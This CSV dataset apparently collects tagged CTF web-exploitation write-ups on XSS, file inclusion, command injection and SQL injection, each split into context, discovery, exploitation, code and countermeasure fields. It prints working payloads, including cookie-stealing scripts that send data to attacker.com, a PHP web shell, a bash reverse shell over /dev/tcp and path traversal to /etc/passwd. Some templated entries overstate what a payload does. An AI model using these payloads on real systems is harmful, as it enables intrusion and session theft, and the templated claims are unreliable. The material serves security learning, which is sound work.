"filename","category","topic","text"
"writeup_0022_tagged.txt","web_exploitation","discovery","To test for XSS, I entered a malicious payload containing JavaScript code into the search box, such as <script>alert('XSS');</script>, which would cause the application to execute the JavaScript code and display an alert box containing the text 'XSS'. Upon submitting the payload, the application executed the JavaScript code, confirming the presence of an XSS vulnerability."
"writeup_0022_tagged.txt","web_exploitation","exploitation","To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the session cookie of a logged-in user. After researching the application's system and network configuration, I crafted a suitable payload containing JavaScript code that would steal the session cookie of a logged-in user and send it to an attacker-controlled server, such as <script>new Image().src='http://attacker.com/cookie.php?cookie='+document.cookie;</script>. This payload allowed me to obtain the session cookie of a logged-in user, which I could then use to impersonate the user and complete the Web Exploitation challenge."
"writeup_0022_tagged.txt","web_exploitation","code","<script>alert('XSS');</script> <script>new Image().src='http://attacker.com/cookie.php?cookie='+document.cookie;</script>"
"writeup_0022_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against Cross-Site Scripting vulnerabilities by implementing proper input validation and output encoding controls, using Content Security Policy (CSP), and validating user input. By exploiting the vulnerability, I was able to steal the session cookie of a logged-in user, complete the Web Exploitation challenge, and demonstrate the potential risks associated with XSS."
"writeup_0023_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that included a file inclusion feature allowing users to include external files into the application. Given the potential security risks associated with including user-provided files, I suspected that the application might be vulnerable to File Inclusion vulnerability, a type of vulnerability that allows attackers to include malicious files and execute arbitrary code."
"writeup_0023_tagged.txt","web_exploitation","discovery","To test for File Inclusion, I entered a malicious payload containing a path traversal sequence into the file inclusion parameter, such as ../../../../etc/passwd, which would cause the application to include the '/etc/passwd' file on the server."
"writeup_0023_tagged.txt","web_exploitation","exploitation","Upon submitting the payload, the application included the '/etc/passwd' file, confirming the presence of a File Inclusion vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the File Inclusion vulnerability to execute arbitrary code on the server. After researching the application's system and network configuration, I crafted a suitable payload containing PHP code that would execute arbitrary code on the server and send the output to an attacker-controlled server, such as <?php system($_GET['cmd']); ?>. This payload allowed me to execute arbitrary code on the server and obtain sensitive information, such as the contents of system files or database credentials."
"writeup_0023_tagged.txt","web_exploitation","code","<?php system($_GET['cmd']); ?>"
"writeup_0023_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against File Inclusion vulnerabilities by implementing proper input validation and output encoding controls, using whitelisting techniques, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the server, obtain sensitive information, complete the Web Exploitation challenge, and demonstrate the potential risks associated with File Inclusion."
"writeup_0024_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that included a user input feature allowing users to execute system commands on the server. Given the potential security risks associated with allowing users to execute system commands, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute arbitrary code on the server."
"writeup_0024_tagged.txt","web_exploitation","discovery","To test for RCE, I entered a malicious payload containing system commands into the user input parameter, such as ; ls -al, which would cause the application to execute the 'ls -al' command on the server."
"writeup_0024_tagged.txt","web_exploitation","exploitation","Upon submitting the payload, the application executed the 'ls -al' command, confirming the presence of an RCE vulnerability. After researching the application's system and network configuration, I crafted a suitable payload containing a reverse shell command that would open a shell on the attacker-controlled server, such as ; bash -i >& /dev/tcp/attacker.com/1234 0>&1. This payload allowed me to execute arbitrary code on the server, obtain sensitive information, and establish a persistent backdoor to the server."
"writeup_0024_tagged.txt","web_exploitation","code","`; ls -al` `; bash -i >& /dev/tcp/attacker.com/1234 0>&1`"
"writeup_0024_tagged.txt","web_exploitation","discovery","To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute arbitrary code on the server and obtain sensitive information."
"writeup_0024_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against Remote Code Execution vulnerabilities by implementing proper input validation and output encoding controls, using whitelisting techniques, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the server, obtain sensitive information, complete the Web Exploitation challenge, and demonstrate the potential risks associated with RCE."
"writeup_0025_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that included a search feature allowing users to search for specific products. Given the potential security risks associated with cross-site scripting (XSS) vulnerabilities, I suspected that the application might be vulnerable to XSS attacks."
"writeup_0025_tagged.txt","web_exploitation","discovery","To test for XSS, I entered a malicious payload containing a JavaScript script into the search parameter, such as <script>alert('XSS');</script>, which would cause the application to execute the JavaScript script on the client-side."
"writeup_0025_tagged.txt","web_exploitation","exploitation","Upon submitting the payload, the application executed the JavaScript script, confirming the presence of an XSS vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the user's session cookie and impersonate the user."
"writeup_0025_tagged.txt","web_exploitation","code","<script>new Image().src=""http://attacker.com/steal.php?cookie=""+document.cookie;</script>"
"writeup_0025_tagged.txt","web_exploitation","discovery","After researching the application's system and network configuration, I crafted a suitable payload containing a script that would steal the user's session cookie and send it to an attacker-controlled server, such as <script>new Image().src=""http://attacker.com/steal.php?cookie=""+document.cookie;</script>. This payload allowed me to steal the user's session cookie, impersonate the user, and gain access to the application's sensitive information."
"writeup_0025_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by implementing proper input validation and output encoding controls, using content security policies, and validating user input. By exploiting the vulnerability, I was able to steal the user's session cookie, impersonate the user, complete the Web Exploitation challenge, and demonstrate the potential risks associated with XSS."
"writeup_0026_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that included a file inclusion feature allowing users to include files on the server. Given the potential security risks associated with file inclusion vulnerabilities, I suspected that the application might be vulnerable to file inclusion attacks."
"writeup_0026_tagged.txt","web_exploitation","discovery","To test for file inclusion, I entered a malicious payload containing a path traversal attack into the file inclusion parameter, such as ../../../../../../etc/passwd, which would cause the application to include the '/etc/passwd' file on the server."
"writeup_0026_tagged.txt","web_exploitation","exploitation","Upon submitting the payload, the application included the '/etc/passwd' file, confirming the presence of a file inclusion vulnerability. After researching the application's system and network configuration, I crafted a suitable payload containing a script that would execute arbitrary code on the server and send the output to an attacker-controlled server, such as php://filter/convert.base64-encode/resource=index.php. This payload allowed me to execute arbitrary code on the server, obtain sensitive information, and establish a persistent backdoor to the server."
"writeup_0026_tagged.txt","web_exploitation","code","None"
"writeup_0026_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against file inclusion vulnerabilities by implementing proper input validation and output encoding controls, using whitelisting techniques, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the server, obtain sensitive information, complete the Web Exploitation challenge, and demonstrate the potential risks associated with file inclusion."
"writeup_0027_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that included a user login feature allowing users to login using their credentials. Given the potential security risks associated with SQL injection vulnerabilities, I suspected that the application might be vulnerable to SQL injection attacks."
"writeup_0027_tagged.txt","web_exploitation","discovery","To test for SQL injection, I entered a malicious payload containing a SQL injection attack into the login parameter, such as admin' --, which would cause the application to execute a valid SQL query and bypass the authentication mechanism."
"writeup_0027_tagged.txt","web_exploitation","exploitation","Upon submitting the payload, the application logged me in as an administrator, confirming the presence of an SQL injection vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL injection vulnerability to extract sensitive information from the database."
"writeup_0027_tagged.txt","web_exploitation","code","admin' UNION SELECT 1,2,3,4,5,6,7 FROM sensitive_table WHERE '1'='1."
"writeup_0027_tagged.txt","web_exploitation","discovery","After researching the application's database schema and structure, I crafted a suitable payload containing a script that would extract sensitive information from the database, such as admin' UNION SELECT 1,2,3,4,5,6,7 FROM sensitive_table WHERE '1'='1. This payload allowed me to extract sensitive information from the database, such as the flag for the Web Exploitation challenge."
"writeup_0027_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against SQL injection vulnerabilities by implementing proper input validation and output encoding controls, using parameterized queries, and validating user input. By exploiting the vulnerability, I was able to extract sensitive information from the database, complete the Web Exploitation challenge, and demonstrate the potential risks associated with SQL injection."
"01_basic_injection_tagged.txt","web_exploitation","context","Just like the title said, the task involves SQL injection (SQLi), which I really have not yet studied. Let's begin."
"01_basic_injection_tagged.txt","web_exploitation","discovery","I have a little experience and understanding of SQL so my study was not long, the point is to make the request valid, for example 1=1 is always true, so the server will return all of the items. This challenge is really friendly and shows what is the resulting query, which helps a lot."
"01_basic_injection_tagged.txt","web_exploitation","exploitation","We need to make the query valid, but not really a big riddle, my resulting input is '' or 'a'='a and the missing ' will be added by the server. The payload going to pull all the data from the database. This is because the input field is not sanitized which makes the searching field vulnerable to the SQL injection. A hacker can pull all the information from a database that included sensitive data."
"02_post_practice_tagged.txt","web_exploitation","context","This is actually a very easy challenge if you know about HTTP, I don't know why the author gave it a Medium difficulty. Let's begin. From the description alone we understand what is the challenge about. Make a POST request, and pass login information, the question is how it should look like and what information we need to pass. In the page we don't see much, checking the source will give us the credentials for the login. Nicely commented us `username: admin | password: 71urlkufpsdnlkadsf` so now we know what are the parameters we need to send, and what are their values."
"02_post_practice_tagged.txt","web_exploitation","discovery","For this task, you are required to play around with the HTTP-request header. By using Burp Suite, the request is originally a GET. Our objective is to change the request from GET to POST. If you look at the response, you should find the username and password for the POST request. As I said the challenge is very easy, it's not even a hard thing to learn how POST request works and what is it."
"03_dont_bump_your_header_tagged.txt","web_exploitation","context","When you visit the site, you can find the clue in the HTML code: ""Sorry, it seems as if your user agent is not correct, in order to access this website."""
"03_dont_bump_your_header_tagged.txt","web_exploitation","discovery","From the clue above, we have to change the User-Agent to Sup3rS3cr3tAg3nt before we send the request to the site. Using Postman, change the user agent and send GET request to /header.php. You will get this response: ""Sorry, it seems as if you did not just come from the site, 'awesomesauce.com'."""
"03_dont_bump_your_header_tagged.txt","web_exploitation","exploitation","You have to change the Referer in the header to awesomesauce.com then you send GET request again to /header.php. The response contains the flag in it."
"04_my_blog_tagged.txt","web_exploitation","context","This is a kind of very unique challenge. No vulnerability, no bug, just a clean blog site. Instead of a complete CTF challenge, this is a test of web development knowledge."
"04_my_blog_tagged.txt","web_exploitation","discovery","If you read the text carefully, ""you may find a good application for your memory."" That is a hint for the challenge. When the dev talked about memory, it must be something to do with the storage."
"04_my_blog_tagged.txt","web_exploitation","exploitation","Question is, how do we access the storage? It is simple, for Firefox browser, open the Developer Tools and go to storage."
"04_my_blog_tagged.txt","web_exploitation","discovery","I find the flag in the storage."
"05_inj3ction_time_tagged.txt","web_exploitation","context","This challenge is a website with a single input where we can search for an id."
"05_inj3ction_time_tagged.txt","web_exploitation","discovery","I'll check if the input is vulnerable. From the description you'll notice that there's SQLi. To check if the ID field is vulnerable to SQLi, the first payload I used was a simple 1', which returned no results. Then I tried 1 OR 1=1. It worked but did not give me anything interesting, so the flag must be somewhere else in the database. I started suspecting that the quotes character is blacklisted."
"05_inj3ction_time_tagged.txt","web_exploitation","discovery","Finding how many columns the query needs. Next, I started to look for how many columns the query needs to work. This information will be needed in a UNION attack."
"05_inj3ction_time_tagged.txt","web_exploitation","exploitation","So at this point, I just use SQLMap to enumerate the db."
"05_inj3ction_time_tagged.txt","web_exploitation","countermeasures","We must first extract the names of the existing databases. The next step is to extract the database information (table, columns, flag)."
"06_gobustme_tagged.txt","web_exploitation","context","The main idea is to bruteforce directories and files hidden in a website. We go to the URL and notice the Ghostbuster theme song, except ""Ghostbusters"" is replaced with ""Gobuster"". The site links Gobuster which explains what kind of software it is."
"06_gobustme_tagged.txt","web_exploitation","discovery","This is a personal preference but DirBuster is a GUI while Gobuster is a CLI which makes DirBuster slightly more beginner friendly. At the bottom of the website, common.txt is provided. This is a wordlist for possible lists to brute force. Set up DirBuster by configuring it to go to the website and use common.txt as the wordlist. If your computer can handle it, check off ""Go Faster"". After running for a bit, DirBuster will give all the results."
"06_gobustme_tagged.txt","web_exploitation","exploitation","Upon visiting /hide we see the message ""It was well hidden isn't it?"" and we get the flag."
"07_calculat3_m3_tagged.txt","web_exploitation","context","A simple command injection challenge will be demonstrated in this walkthrough. The site gives a calculator that you can click the buttons to input expression, then it will eval the expression and gives a result."
"07_calculat3_m3_tagged.txt","web_exploitation","discovery","I provided random input in this calculator and intercepted the request with BurpSuite. I got one parameter taking the values: expression: 5 * 6"
"07_calculat3_m3_tagged.txt","web_exploitation","exploitation","Try to get the contents in directory, set the expression to ;ls. Submit it to get a list of file names in result, the flag is the one starts with ctf."
"07_calculat3_m3_tagged.txt","web_exploitation","code",";ls"
"07_calculat3_m3_tagged.txt","web_exploitation","countermeasures","This challenge demonstrates the importance of properly validating user input and preventing command injection attacks. It also highlights the need for secure coding practices and regular security testing to identify and address vulnerabilities in web applications."
"08_audioedit_tagged.txt","web_exploitation","context","The challenge description said ""I made this cool site for editing audio files. Can you exploit it?"". After visiting the site, I got a simple page with written ""AudioEdit"" with the chance of upload a .mp3 audio file."
"08_audioedit_tagged.txt","web_exploitation","discovery","The provided file will be uploaded and the discovered insertion statement in the db looks like this: `INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'author','title'...);`."
"08_audioedit_tagged.txt","web_exploitation","exploitation","In order to do an SQL-injection we have to create a special author and title field. I used easyTAG but of course you can use the tool of your choice to modify mp3 metadata. In order to inject and maintain a valid INSERT statement you can create a mp3 with the following metadata: `title  = """" (not important) author = a', (SELECT @@version))-- -b`, which creates the following statement. This gave us the database version."
"08_audioedit_tagged.txt","web_exploitation","discovery","Next we wanted to know the tables name. And of course the columns names."
"08_audioedit_tagged.txt","web_exploitation","exploitation","Finally we get the flag."
"08_audioedit_tagged.txt","web_exploitation","code","INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'a', (SELECT @@version))-- -b',''...);"
"09_grid_it_tagged.txt","web_exploitation","context","We are given a register/login panel on a webpage. After logging in, we see a 2D plane where we can add or remove points. Requests go through ""controller.php?action="", with various actions available."
"09_grid_it_tagged.txt","web_exploitation","discovery","We notice a PHP serialized object when deleting points. We try SQL Injection by modifying the object and all points disappear. We observe that the delete() function is invoked on the point object, hinting at PHP Object Injection. However, the classes containing the ::delete() method (Phar and PharData) seem useless for this task."
"09_grid_it_tagged.txt","web_exploitation","exploitation","We return to SQL Injection, aiming for Blind SQL Injection since there's no output. Our goal is to fetch table and column names inside the database. We create queries with conditions based on the comparison of ASCII codes of characters in the desired data. We perform a binary search to find the correct characters and retrieve the entire name. We find two tables and six columns. We fetch the admin's password with a similar query and obtain an MD5 hash."
"09_grid_it_tagged.txt","web_exploitation","countermeasures","After cracking the MD5 hash, we get the password: grapevine. Logging in as admin, we receive the flag: ctflearn{obj3ct_inj3ct1on}. The name is misleading as it wasn't an object injection, just object modification."
"10_prehashbrown_tagged.txt","web_exploitation","context","In the site we have a search bar that is SQL Injection vulnerable."
"10_prehashbrown_tagged.txt","web_exploitation","discovery","So, using Burpsuite, I capture the request header and saved as header.txt."
"10_prehashbrown_tagged.txt","web_exploitation","discovery","I started to enumerate the database using SQLMap. So, I tried to enumerate a certain table."
"10_prehashbrown_tagged.txt","web_exploitation","exploitation","The flag is within the table and I dumped all information from the table. Finally I get the flag!"
